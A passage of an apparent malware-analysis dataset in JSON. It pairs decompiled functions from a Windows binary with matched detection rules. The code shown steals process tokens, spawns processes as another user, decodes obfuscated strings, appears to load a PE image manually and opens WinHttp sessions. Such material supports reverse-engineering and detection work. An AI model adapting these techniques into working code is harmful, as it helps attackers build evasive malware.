(iVar9 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(phNewToken, 0xc, pSessionId, 4);\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar5 != 0) {\n                        var_80h = 0x20;\n                        var_84h = pSid;\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(phNewToken, 0x19, &var_84h, iVar5 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    dwProcessId = 0;\n                    (*pcVar1)(phNewToken, 0x1b, &dwProcessId, 4);\n                    iVar5 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_38h, phNewToken, 1);\n                    if (iVar5 == 0) {\n                        var_38h = 0;\n                    }\n                    else {\n                        var_2ch = 0x400;\n                    }\n                    var_d0h = 0x44;\n                    var_20h = 0x4a5e6115;\n                    var_1ch = 0x61113328;\n                    var_18h = 0x33274a43;\n                    var_14h = 0x4a6b6152;\n                    var_10h = 0x61073322;\n                    var_ch = 0x33274a51;\n                    var_8h = 0x4a5b6117;\n                    var_4h._0_1_ = 0x32;\n                    var_4h._1_1_ = 0x33;\n                    var_4h._2_2_ = 0x6162;\n                    var_44h = 0x4a376162;\n                    var_40h._0_2_ = 0x3346;\n                    uVar2 = (*pcVar6)(8, 0x41);\n                    var_c8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_48h = 6;\n                    var_3ch = &var_20h - var_c8h;\n                    lpMem = var_c8h;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                        if (iVar5 != 0x9d07c1) {\n                            *(iVar3 + var_c8h) = *(&var_44h + iVar3 % var_48h) ^ (iVar3 + var_c8h)[&var_20h - var_c8h];\n                        }\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 0x20);\n                    var_a0h._0_2_ = 0;\n                    var_a4h = 1;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41daac);\n                    var_14h = 0x7a7f705b;\n                    var_10h = 0x705b540a;\n                    var_ch = 0x54597a76;\n                    var_8h = 0x7a29705c;\n                    var_4h._0_1_ = 0x79;\n                    var_4h._1_1_ = 0x54;\n                    var_58h = 0x7a5a7079;\n                    var_54h._0_2_ = 0x5479;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar9 = 0;\n                    var_44h = iVar5;\n                    var_3ch = &var_14h - iVar5;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                        if (iVar3 != 0x241b38) {\n                            *(iVar9 + iVar5) = *(&var_58h + iVar9 % var_48h) ^ (iVar9 + iVar5)[&var_14h - iVar5];\n                        }\n                        iVar9 = iVar9 + 1;\n                    } while (iVar9 < 0x12);\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (phNewToken, &lpApplicationName, 0, 0, 0, 0, var_2ch, var_38h, 0, &var_d0h, var_64h);\n                    var_14h = 0x7141421b;\n                    var_10h = 0x3037635b;\n                    var_ch = 0x420a3506;\n                    var_8h = 0x635a715e;\n                    var_4h._0_1_ = 0x42;\n                    var_4h._1_1_ = 0x30;\n                    var_2ch = 0x71304263;\n                    var_28h._0_1_ = 0x35;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar9 = 0;\n                    var_3ch = &var_14h - iVar5;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                        iVar3 = var_44h;\n                        piVar7 = var_64h;\n                        if (iVar4 != 0x5556e3) {\n                            *(iVar9 + iVar5) = *(&var_2ch + iVar9 % var_70h) ^ (iVar9 + iVar5)[&var_14h - iVar5];\n                        }\n                        iVar9 = iVar9 + 1;\n                    } while (iVar9 < 0x12);\n                    if (*var_64h != 0) {\n                        iVar9 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_64h, 0x201eb, &TokenHandle);\n                        if (iVar9 != 0) {\n                            fcn.0040b30d();\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(piVar7[1]);\n                    }\n                    if (var_38h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_38h);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(phNewToken);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar6)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar6)(0, lpMem);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    iVar5 = var_7ch;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hExistingToken);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n        uVar2 = (*pcVar6)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return *var_64h;\n}\n",
        "token_count": 2825
    },
    "0040d74a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d74a(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41dadc == 0) {\n        puStack572 = 0x40d791;\n        *0x41dbb8 = fcn.0040a717();\n    }\n    else {\n        puStack572 = 0x40d786;\n        *0x41dbb8 = fcn.0040cdb5();\n    }\n    if (*0x41dbb8 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x40d7a5;\n        fcn.0040ae4d();\n        iStack552 = *0x41dbb8;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41daa4;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41dbb8, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41dbb8, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040d74a, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41dbb8);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 738
    },
    "0040d850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d850(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1550
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uint var_280h;\n    uint hHeap;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort uStack28;\n    uchar *var_16h;\n    uchar *lpLibFileName;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    hHeap = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar8)(uVar3 | 2);\n    var_24h._0_1_ = 0x3b;\n    var_24h._1_1_ = 0x1e;\n    var_24h._2_2_ = 0x2637;\n    var_20h._0_2_ = 0x7f36;\n    var_20h._2_2_ = 0x785a;\n    var_1ch._0_1_ = 0x16;\n    var_ch = 0x6;\n    var_1ch._1_1_ = 6;\n    stack0xffffffe2 = CONCAT22(uStack28, 0x4c16);\n    var_8h = 0x6a725668;\n    var_4h._0_2_ = 0x4c7a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar12 = 0;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar6 != 0x8e3dfc) {\n            *(iVar12 + iVar5) = *(&var_8h + iVar12 % var_ch) ^ (iVar12 + iVar5)[&var_24h - iVar5];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0xc);\n    var_28h = 0x34202b2b;\n    var_24h._0_1_ = 0x35;\n    var_24h._1_1_ = 6;\n    var_24h._2_2_ = 0x120;\n    var_20h._0_2_ = 0x3a30;\n    var_20h._2_2_ = 0x100d;\n    var_1ch._0_1_ = 0x22;\n    var_1ch._1_1_ = 0x18;\n    stack0xffffffe2 = 0x1a320f26;\n    var_16h._0_1_ = 0x59;\n    var_8h = 0x594d4468;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x54);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_ch = 0x5;\n    iVar12 = 0;\n    var_7ch = iVar5;\n    unique0x10000441 = &var_28h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        iVar2 = lpLibFileName;\n        iVar6 = var_7ch;\n        if (iVar7 != 0x37e52f) {\n            *(iVar12 + iVar5) = *(&var_8h + iVar12 % var_ch) ^ (iVar12 + iVar5)[&var_28h - iVar5];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x13);\n    puVar13 = &var_280h;\n    for (iVar5 = 0x200; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar2, iVar6);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    (*pcVar8)(uVar4, &hHeap);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    lpLibFileName = puVar10;\n    iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(uVar4, L\"-test\");\n    if (iVar5 == 0) goto code_r0x0040dbfb;\n    uVar4 = 0x4df;\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar4);\ncode_r0x0040dbfb:\n            puVar11 = puVar10;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            iVar5 = 0;\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, puVar10, 0x104);\n            *0x41daac = puVar10;\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            puVar10 = fcn.0040189b();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if (puVar10 != 0x1) break;\n            fcn.00409c86();\n            uVar4 = (*pcVar8)(0, lpLibFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = 0;\n        }\n        var_78h = 0x6c184176;\n        var_74h = 0x59115313;\n        var_70h = 0x41124328;\n        var_6ch = 0x53026c0d;\n        var_68h = 0x43305964;\n        var_64h = 0x6c30411e;\n        var_60h = 0x59335320;\n        var_5ch = 0x41204303;\n        var_58h = 0x53256c36;\n        var_54h = 0x43305935;\n        var_50h = 0x6c37411a;\n        var_4ch = 0x59245337;\n        var_48h = 0x413d431e;\n        var_44h = 0x53376c3c;\n        var_40h = 0x43295961;\n        var_3ch = 0x6c29412b;\n        var_38h = 0x592e532f;\n        var_34h = 0x4136431e;\n        var_30h._0_1_ = 0x2b;\n        var_30h._1_2_ = 0x1f6c;\n        var_30h._3_1_ = 0x53;\n        var_2ch._0_2_ = 0x5941;\n        var_8h = 0x6c594153;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x43);\n        uVar4 = (*pcVar8)(8, 0x9d);\n        iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_7ch = iVar12;\n        lpLibFileName = &var_78h - iVar12;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar6 != 0x7ae91) {\n                *(iVar5 + iVar12) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar12)[&var_78h - iVar12];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x4e);\n        var_54h = 0x72365071;\n        var_50h = 0x65235400;\n        var_4ch = 0x50317906;\n        var_48h = 0x542b7208;\n        var_44h = 0x791d653f;\n        var_40h = 0x72405020;\n        var_3ch = 0x65045425;\n        var_38h = 0x50277913;\n        var_34h = 0x540a720e;\n        var_30h._0_1_ = 0xc;\n        var_30h._1_2_ = 0x7265;\n        var_30h._3_1_ = 0x79;\n        var_8h = 0x72655054;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x79);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar5 = 0;\n        lpLibFileName = &var_54h - puVar10;\n        do {\n            iVar12 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar12 != 0xf33c2a) {\n                puVar10[iVar5] = *(&var_8h + iVar5 % var_ch) ^ (puVar10 + iVar5)[&var_54h - puVar10];\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x28);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        puVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_ch = puVar11;\n        uVar4 = (*pcVar8)(8, 0x208);\n        *NULL = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar11 = 0;\n            puVar11 = puVar11 + 1;\n        }\n        puVar11 = *NULL;\n        for (iVar5 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar11 = 0;\n            puVar11 = puVar11 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_7ch, var_ch, 0x104);\n        (*pcVar1)(puVar10, stack0xffffffe8, 0x104);\n        iVar5 = fcn.0040840d();\n        if (iVar5 != 0) break;\n        iVar5 = fcn.00403f3c();\n        if (iVar5 == 0) break;\n        fcn.00402ac8();\n        uVar4 = 0;\n    }\n    fcn.0040de8a();\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00407bac, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    uVar4 = (*pcVar8)(0, var_ch);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar8)(0, stack0xffffffe8);\n    (*pcVar1)(uVar4);\n    do {\n        (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n    } while( true );\n}\n",
        "token_count": 3030
    },
    "0040df87": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort * __cdecl\nfcn.0040df87(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h, int32_t nServerPort)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    int32_t iVar5;\n    ushort *puVar6;\n    code *pcVar7;\n    uint var_418h;\n    uint lpszHeaders;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    int32_t var_f0h;\n    uint lpdwBufferLength;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d3h;\n    uint var_cfh;\n    uint var_cbh;\n    uint var_c7h;\n    uint var_c3h;\n    uint var_bfh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    int32_t *var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint *hRequest;\n    int32_t lpMultiByteStr;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpBuffer;\n    uint *var_8h;\n    uint var_4h;\n    \n    puVar3 = &lpszHeaders;\n    var_44h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar4 = 0x100; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_418h;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_fch = 0;\n        var_100h = 0x34367964;\ncode_r0x0040dffc:\n        var_104h = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_fch = 0;\ncode_r0x0040dff2:\n            var_100h = 0x32337964;\n            goto code_r0x0040dffc;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_fch = 0x30;\n            goto code_r0x0040dff2;\n        }\n    }\n    hRequest = &var_104h;\n    if (lpdwNumberOfBytesRead != NULL) {\n        hRequest = lpdwNumberOfBytesRead;\n    }\n    iVar4 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar4 == 0) {\n        return 0x3;\n    }\n    lpdwNumberOfBytesRead = 0x6;\n    var_3ch = 5;\n    if (*0x41dbbc == 0) {\n        var_e8h = 0x620e641f;\n        var_e4h = 0x643b5a49;\n        var_e0h = 0x5a5f620d;\n        var_dch = 0x624e6433;\n        var_d8h._0_1_ = 6;\n        stack0xffffff25 = 0x51647c5a;\n        var_d3h = 0x7a5a1362;\n        var_cfh = 0x5a623664;\n        var_cbh._0_2_ = 0x3c5a;\n        var_cbh._2_1_ = 100;\n        var_cbh._3_1_ = 5;\n        var_c7h = 0x255a5c62;\n        var_c3h = 0x13621264;\n        var_bfh = 0x35641c5a;\n        var_bbh = 0x645a1362;\n        var_b7h = 0x2624f64;\n        var_b3h = 0x4164695a;\n        var_afh = 0x3b5a6462;\n        var_abh._0_2_ = 0xf64;\n        var_abh._2_1_ = 0x62;\n        var_a7h = 0x5a64665a;\n        var_a3h = 0x2a5a1362;\n        var_9fh = 0x7625764;\n        var_9bh = 0x4164695a;\n        var_97h = 0x245a4162;\n        var_93h._0_2_ = 0x5b64;\n        var_93h._2_1_ = 0x62;\n        var_93h._3_1_ = 1;\n        var_8fh = 0x4f64675a;\n        var_8bh = 0x7b5a0362;\n        var_87h = 0x74624164;\n        var_83h = 0x264375a;\n        var_7fh = 0x3d5a5862;\n        var_7bh._0_2_ = 0x4e64;\n        var_7bh._2_1_ = 0x62;\n        var_7bh._3_1_ = 1;\n        var_77h = 0x5164635a;\n        var_73h = 0x625a0362;\n        var_6fh = 0x3625064;\n        var_6bh = 0x4164635a;\n        var_67h = 0x3b5a7562;\n        var_63h = 0x56621364;\n        var_5fh = 0xe64345a;\n        var_5bh = 0x7d5a4b62;\n        var_57h._0_2_ = 0x5364;\n        var_57h._2_1_ = 0x62;\n        var_53h = 0x51647c5a;\n        var_4fh._0_2_ = 0x3362;\n        var_4fh._2_1_ = 0x5a;\n        var_8h = 0x62616452;\n        var_4h = CONCAT22(var_4h._2_2_, 0x5a33);\n        var_abh._3_1_ = var_cbh._3_1_;\n        var_57h._3_1_ = var_d8h;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        lpdwNumberOfBytesAvailable = &var_e8h - iVar4;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar2 != 0x71b67d) {\n                *(iVar5 + iVar4) =\n                     *(&var_8h + iVar5 % lpdwNumberOfBytesRead) ^ (iVar5 + iVar4)[lpdwNumberOfBytesAvailable];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x9c);\n        *0x41dbbc = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar4, 0, 0, 0, 0);\n        if (*0x41dbbc == 0) {\n            uVar1 = (*pcVar7)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return 0x1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41dbbc, 